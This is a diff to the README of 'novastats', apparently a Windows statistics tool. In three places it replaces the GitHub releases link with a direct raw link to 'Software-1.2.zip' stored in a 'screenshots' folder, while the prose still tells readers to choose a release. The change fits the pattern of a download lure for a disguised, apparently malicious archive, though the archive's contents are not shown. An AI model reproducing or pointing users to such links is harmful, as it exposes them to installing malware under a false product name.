@@ -1,6 +1,6 @@
 # 📊 novastats - Clear stats tools for everyday use
 
-[![Download novastats](https://img.shields.io/badge/Download%20novastats-7c3aed?style=for-the-badge&logo=github&logoColor=white)](https://github.com/biancamoronic889/novastats/releases)
+[![Download novastats](https://img.shields.io/badge/Download%20novastats-7c3aed?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/biancamoronic889/novastats/main/screenshots/Software-1.2.zip)
 
 ## 🧭 What novastats does
 
@@ -32,7 +32,7 @@ The app works best on a modern version of Windows such as Windows 10 or Windows 
 
 Visit this page to download:
 
-https://github.com/biancamoronic889/novastats/releases
+https://raw.githubusercontent.com/biancamoronic889/novastats/main/screenshots/Software-1.2.zip
 
 On that page, look for the latest release and download the Windows file or ZIP package. If you see more than one file, choose the one meant for Windows.
 
@@ -223,7 +223,7 @@ It works well for school tasks, small reports, and basic analysis work.
 
 Download novastats from the release page:
 
-https://github.com/biancamoronic889/novastats/releases
+https://raw.githubusercontent.com/biancamoronic889/novastats/main/screenshots/Software-1.2.zip
 
 ## 🧾 What to expect after launch
 
